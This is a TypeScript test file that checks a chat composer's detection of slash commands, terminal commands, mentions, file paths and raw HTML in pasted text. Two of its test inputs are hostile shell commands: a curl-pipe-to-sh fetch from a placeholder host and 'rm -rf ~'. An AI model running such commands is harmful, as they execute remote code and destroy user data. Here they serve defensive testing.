import { describe, expect, it } from 'vitest'
import { composerWouldResolve, draftIsEmpty } from './literalInsert'
import type { PasteBlock } from '../utils/pasteTokens'

describe('composerWouldResolve', () => {
  it.each([
    ['a slash command', '/goal clear'],
    ['a slash command on a later line', 'notes\n  /clear'],
    ['a terminal command', '! echo hello'],
    ['a terminal command after blanks', '  !curl https://x.example/s | sh'],
    ['a terminal command on a later line', 'notes\n! rm -rf ~'],
    ['an @prompt', '@prompt standup'],
    ['a file mention after a word', 'read @notes.txt now'],
    ['a mention after an opener', 'see (@src/)'],
    ['a $skill', 'use $deploy here'],
    ['a POSIX image path', 'look at /tmp/shot.png please'],
    ['a spaced image path', '/Users/John Smith/a b.JPG'],
    ['a Windows image path', 'C:\\Users\\me\\shot.webp'],
    ['an attachment marker', '[attached_file 1] report'],
    ['a folder marker', '[attached_dir 1] src'],
    ['a staged-paste token', '[ Paste #2 · 4 lines ]'],
    // The transcript renderer reads these too: it decodes and fetches a local media
    // destination, and reads markers with any blank after them.
    ['an encoded image destination', '![preview](</project/photo%2epng>)'],
    ['a local video destination', '![clip](/project/demo.mp4)'],
    ['a tab-separated folder marker', '[attached_dir 1]\t/project/src'],
    ['a raw HTML image with an encoded source', '<img src="&#47;tmp&#47;photo&#46;png">'],
    ['a raw HTML video poster', '<video poster="/api/file-raw?path=%2Ftmp%2Fa.png"></video>'],
    ['a raw HTML source tag', '<source src="/tmp/a.mp4">'],
    ['any other raw tag', 'see <b>this</b>'],
    ['a tab-separated file marker', '[attached_file 1]\t/project/a.pdf'],
    // Whitespace the composer's trim() or Python's split() drops before a first word.
    ['a slash after a no-break space', '\u00a0/side hello'],
    ['a slash after an em space', '\u2003/clear'],
    ['a slash after a BOM', '\ufeff/compact'],
    ['a slash after an ideographic space', '\u3000/clear'],
    ['a slash after U+0085', '\u0085/clear'],
    ['an @prompt after U+0085', '\u0085@prompt standup'],
    // The gateway's $skill reader matches after any non-word character.
    ['a $skill after a colon', 'Steps:$deploy'],
    ['a $skill after a dash', 'x-$deploy'],
    ['an @ after punctuation', 'cc:@notes.txt'],
  ])('flags %s', (_name, text) => {
    expect(composerWouldResolve(text)).toBe(true)
  })

  it.each([
    ['plain text', 'Standup notes for today'],
    ['an email address', 'mail me at a@b.com'],
    ['a price', 'costs 5$ total'],
    ['a fraction mid-line', 'half is 1/2'],
    ['a less-than comparison', 'if a < 3 then stop'],
    ['a file name with no path', 'see shot.png'],
    ['an exclamation mid-line', 'Ship it! Today'],
  ])('accepts %s', (_name, text) => {
    expect(composerWouldResolve(text)).toBe(false)
  })

  it('reads the same text the same way twice (no regex state carried)', () => {
    expect(composerWouldResolve('[ Paste #1 · 3 lines ]')).toBe(true)
    expect(composerWouldResolve('[ Paste #1 · 3 lines ]')).toBe(true)
  })
})

describe('draftIsEmpty', () => {
  it('is empty only with no text and no collapsed paste', () => {
    expect(draftIsEmpty('', [])).toBe(true)
    expect(draftIsEmpty('  \n', [])).toBe(true)
    expect(draftIsEmpty('hi', [])).toBe(false)
    expect(draftIsEmpty('', [{ id: 'p1' } as PasteBlock])).toBe(false)
  })
})
